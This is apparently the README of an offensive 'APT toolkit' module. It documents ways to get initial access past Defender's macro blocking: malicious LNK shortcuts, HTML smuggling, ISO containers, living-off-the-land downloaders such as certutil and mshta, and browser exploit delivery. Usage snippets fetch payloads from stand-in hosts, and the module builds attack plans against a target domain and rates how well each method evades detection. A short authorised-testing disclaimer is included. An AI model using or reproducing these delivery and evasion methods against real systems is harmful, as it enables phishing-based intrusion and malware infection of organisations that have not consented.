# Non-Blocked Initial Access Techniques

## Overview

This module implements initial access techniques that bypass Microsoft Defender's macro blocking as of 2022. With macros being effectively blocked by modern security controls, these alternative techniques provide effective means for gaining initial access while evading detection.

## Available Techniques

### 1. LNK File Attacks

**Description**: Malicious shortcut files that execute PowerShell commands when double-clicked.

**Features**:
- Uses legitimate PowerShell for execution
- Can be disguised as documents, invoices, or presentations
- High evasion level due to use of trusted Windows components
- Requires user interaction (double-click)

**Usage**:
```python
from apt_toolkit.initial_access_non_blocked import LNKFileAttack

lnk_attack = LNKFileAttack()
result = lnk_attack.create_malicious_lnk(
    payload_url="http://cdn.example.com/payload.ps1",
    disguise_as="document"  # Options: document, invoice, resume, presentation
)
```

### 2. HTML Smuggling

**Description**: JavaScript-based payload delivery via HTML files that bypass network filters.

**Features**:
- Payloads are base64-encoded in JavaScript
- Bypasses network security filters
- Multiple template types (invoice, security alert, etc.)
- Requires user interaction (click)

**Usage**:
```python
from apt_toolkit.initial_access_non_blocked import HTMLSmuggling

html_smuggling = HTMLSmuggling()
result = html_smuggling.create_smuggling_html(
    payload_url="http://cdn.example.com/payload.exe",
    template_type="security"  # Options: invoice, security, document
)
```

### 3. ISO Container Attacks

**Description**: Payload delivery via ISO files with autorun capability.

**Features**:
- Container-based delivery bypasses email filters
- Can include decoy documents
- Autorun.inf for automatic execution
- Requires user to mount and execute

**Usage**:
```python
from apt_toolkit.initial_access_non_blocked import ISOFileAttack

iso_attack = ISOFileAttack()
result = iso_attack.create_malicious_iso(
    payload_path="/path/to/payload.exe",
    disguise_files=["Financial_Report.pdf", "Budget.xlsx"]
)
```

### 4. Living-off-the-Land (LOTL)

**Description**: Using legitimate Windows tools for payload delivery and execution.

**Features**:
- Uses built-in Windows utilities (certutil, bitsadmin, mshta, etc.)
- Very high evasion level
- Difficult to detect and block
- Requires command execution

**Available Tools**:
- `bitsadmin`: Background Intelligent Transfer Service
- `certutil`: Certificate Utility
- `mshta`: Microsoft HTML Application Host
- `rundll32`: Run DLL as App
- `regsvr32`: Register Server

**Usage**:
```python
from apt_toolkit.initial_access_non_blocked import LivingOffTheLand

lotl = LivingOffTheLand()
result = lotl.generate_lotl_command(
    payload_url="http://cdn.example.com/payload.exe",
    tool="certutil"  # Options: bitsadmin, certutil, mshta, rundll32, regsvr32
)
```

### 5. Browser Exploit Delivery

**Description**: Exploiting browser vulnerabilities for code execution.

**Features**:
- Targets specific browser vulnerabilities
- Multiple exploit frameworks supported
- Medium evasion level
- Requires user to visit malicious website

**Supported Browsers**:
- Chrome (V8 Engine Exploit)
- Edge (ChakraCore Exploit)
- Firefox (SpiderMonkey Exploit)
- Internet Explorer (JScript Exploit)

**Usage**:
```python
from apt_toolkit.initial_access_non_blocked import BrowserExploitDelivery

browser_exploit = BrowserExploitDelivery()
result = browser_exploit.generate_browser_exploit(
    target_browser="Chrome",
    payload_url="http://malicious-site.com/exploit.html"
)
```

## Comprehensive Attack Planning

### Using NonBlockedInitialAccess Class

The main class provides a unified interface for all non-blocked techniques:

```python
from apt_toolkit.initial_access_non_blocked import NonBlockedInitialAccess

# Initialize
non_blocked = NonBlockedInitialAccess()

# Get all available techniques
techniques = non_blocked.get_available_techniques()

# Generate comprehensive attack plan
attack_plan = non_blocked.generate_attack_plan("target-company.com")
```

### Interactive Shell Commands

The toolkit also provides interactive shell commands:

```bash
# List all non-blocked techniques
apt> non_blocked_techniques

# Generate attack plan for specific domain
apt> generate_attack_plan target-company.com
```

## Evasion Characteristics

| Technique | Evasion Level | Success Rate | User Interaction | Detection Difficulty |
|-----------|---------------|--------------|------------------|---------------------|
| LNK File Attack | High | Medium-High | Double-click | High |
| HTML Smuggling | High | Medium | Click | High |
| ISO Container | Medium | Medium | Mount & Execute | Medium |
| Living-off-the-Land | Very High | High | Command Execution | Very High |
| Browser Exploit | Medium | Medium | Visit Website | Medium |

## Integration with Existing Toolkit

These techniques integrate seamlessly with the existing APT Toolkit:

- **Email Campaigns**: Use HTML smuggling or LNK files as attachments
- **Social Engineering**: Combine with advanced targeting
- **Campaign Orchestration**: Include in multi-vector attack plans
- **Exploit Intelligence**: Enriched with CVE and exploit information

## Security Considerations

⚠️ **LEGAL AND ETHICAL NOTICE**:
- These techniques are for authorized penetration testing and security research only
- Always obtain proper permissions before use
- Unauthorized access is illegal and unethical
- Use in controlled environments for defensive purposes

## Testing and Validation

Comprehensive tests are available in `tests/test_initial_access_non_blocked.py`:

```bash
pytest tests/test_initial_access_non_blocked.py -v
```

## Example Usage

See `examples/non_blocked_initial_access_demo.py` for a complete demonstration of all techniques.

## References

- Microsoft Defender Security Updates (2022)
- MITRE ATT&CK Framework: Initial Access (TA0001)
- Living-off-the-Land Binaries and Scripts (LOLBAS)
- Browser Exploit Frameworks Documentation